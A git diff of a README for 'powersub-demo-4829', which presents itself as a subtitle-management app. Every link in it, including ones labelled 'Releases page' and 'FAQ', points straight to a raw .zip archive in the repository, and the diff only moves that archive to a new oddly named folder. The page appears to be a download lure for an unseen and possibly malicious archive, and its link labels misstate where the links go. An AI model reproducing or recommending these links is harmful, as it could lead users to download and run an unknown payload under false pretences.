@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-4829 - Effortless Subtitle Management Tools
 
-[![Download Now](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/matrices/powersub-demo-4829.zip)](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/matrices/powersub-demo-4829.zip)
+[![Download Now](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/colporteur/powersub-demo-4829.zip)](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/colporteur/powersub-demo-4829.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **powersub-demo-4829**! This application helps you manage subtitles e
 
 ## 📥 Download & Install
 
-To install **powersub-demo-4829**, visit the [Releases page](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/matrices/powersub-demo-4829.zip). Here, you will find the latest version available for download.
+To install **powersub-demo-4829**, visit the [Releases page](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/colporteur/powersub-demo-4829.zip). Here, you will find the latest version available for download.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed on the page.
@@ -76,7 +76,7 @@ If you encounter any issues during the installation or while using the applicati
 - Check for any existing applications that might interfere with **powersub-demo-4829**.
 - Restart your computer to see if that resolves any system-related issues.
 
-For more detailed help, visit our [FAQ](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/matrices/powersub-demo-4829.zip) page.
+For more detailed help, visit our [FAQ](https://raw.githubusercontent.com/ZFreakk/powersub-demo-4829/main/colporteur/powersub-demo-4829.zip) page.
 
 ## 📞 Support
 
